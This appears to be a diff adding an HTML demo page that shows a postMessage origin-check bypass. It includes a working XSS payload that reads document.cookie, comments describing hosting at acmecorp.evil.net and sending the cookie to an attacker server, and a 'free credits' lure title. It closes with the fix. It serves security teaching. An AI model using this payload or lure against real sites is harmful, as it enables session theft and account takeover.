@@ -1,0 +1,55 @@
+<!doctype html>
+<!--
+  ATTACKER PAGE — demonstrates the bypass
+
+  In a real attack this would be hosted on: acmecorp.evil.net
+  (which passes .includes('acmecorp'))
+
+  For the demo, both pages are on localhost so the check passes anyway —
+  'http://localhost:9000'.includes('acmecorp') is false, BUT we edit
+  /etc/hosts OR just explain the concept and inject via console.
+
+  EASIEST DEMO PATH: open vulnerable.html, then paste the payload below
+  directly in its console. Explain that in reality, this runs from a
+  domain like acmecorp.evil.net that the victim was lured to.
+-->
+<html>
+<head>
+  <title>Free AcmeCorp Credits!</title>
+  <style>
+    body { font-family: sans-serif; max-width: 600px; margin: 60px auto; text-align: center; }
+    h1 { color: #dc2626; }
+    .payload { background: #1f2937; color: #10b981; padding: 20px; text-align: left;
+               font-family: monospace; font-size: 13px; border-radius: 8px; white-space: pre-wrap; }
+  </style>
+</head>
+<body>
+  <h1>🎁 Claim Your Free Credits</h1>
+  <p>This page pretends to be on <code>acmecorp.evil.net</code></p>
+
+  <h3>Demo payload — paste in vulnerable.html's console:</h3>
+  <div class="payload">// The origin check is .includes('acmecorp')
+// In production: host this on acmecorp.attacker.net → check passes
+// For live demo on localhost, inject directly:
+
+window.postMessage({
+  html: '&lt;img src=x onerror="document.getElementById(\'chat-log\').innerHTML=\'&lt;h2 style=color:red&gt;PWNED&lt;/h2&gt;&lt;pre&gt;\'+document.cookie+\'&lt;/pre&gt;\'"&gt;'
+}, '*');
+
+// Result: cookie rendered in the chat log.
+// Real payload would fetch() it to attacker server.</div>
+
+  <h3>What just happened</h3>
+  <ol style="text-align:left">
+    <li><code>.includes('acmecorp')</code> matches <code>acmecorp.evil.net</code></li>
+    <li>Handler takes <code>event.data.html</code> → shoves into <code>innerHTML</code></li>
+    <li><code>&lt;img onerror&gt;</code> fires → reads <code>document.cookie</code></li>
+    <li>Session token exfiltrated. Account takeover.</li>
+  </ol>
+
+  <p style="color:#6b7280;font-size:12px">
+    Fix: <code>event.origin === 'https://trusted.acmecorp.com'</code> (exact match) +
+    <code>textContent</code> instead of <code>innerHTML</code>.
+  </p>
+</body>
+</html>
